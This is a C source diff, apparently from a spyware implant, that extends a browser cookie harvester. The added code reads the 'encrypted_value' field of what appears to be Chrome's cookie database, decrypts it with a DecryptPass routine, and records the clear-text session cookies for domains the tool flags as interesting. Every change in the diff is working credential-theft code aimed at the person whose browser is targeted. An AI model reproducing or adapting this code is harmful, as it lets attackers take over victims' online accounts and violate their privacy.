@@ -19,6 +19,7 @@ extern char *HM_CompletePath(char *file_name, char *buffer);
 extern char *GetDosAsciiName(WCHAR *orig_path);
 extern char *DeobStringA(char *string);
 extern WCHAR *GetCHProfilePath();
+extern int DecryptPass(CHAR *cryptData, WCHAR *clearData, UINT clearSize);
 
 int static InitSocialLibs()
 {
@@ -50,6 +51,12 @@ int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azC
 	char *name = NULL;
 	char *value = NULL;
 
+	WCHAR enc_value[2048];
+	char enc_value_a[2048];
+
+	ZeroMemory(enc_value, sizeof(enc_value));
+	ZeroMemory(enc_value_a, sizeof(enc_value_a));
+
 	for(int i=0; i<argc; i++){
 		if(!host && !_stricmp(azColName[i], "host_key"))
 			host = _strdup(argv[i]);
@@ -57,11 +64,19 @@ int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azC
 			name = _strdup(argv[i]);
 		if(!value && !_stricmp(azColName[i], "value"))
 			value = _strdup(argv[i]);
+		if(!_stricmp(azColName[i], "encrypted_value") && argv[i] && argv[i][0]) {
+			DecryptPass(argv[i], enc_value, 2048);
+			_snprintf_s(enc_value_a, sizeof(enc_value_a), _TRUNCATE, "%S", enc_value);		
+		}
 	}	
 
 	NormalizeDomainA(host);
-	if (host && name && value && IsInterestingDomainA(host))
-		AddCookieA(host, name, value);
+	if (host && name && value && IsInterestingDomainA(host)) {
+		if (value[0]==NULL && enc_value_a[0]!=NULL) // Se era un cookie cifrato
+			AddCookieA(host, name, enc_value_a);
+		else
+			AddCookieA(host, name, value);
+	}
 
 	SAFE_FREE(host);
 	SAFE_FREE(name);
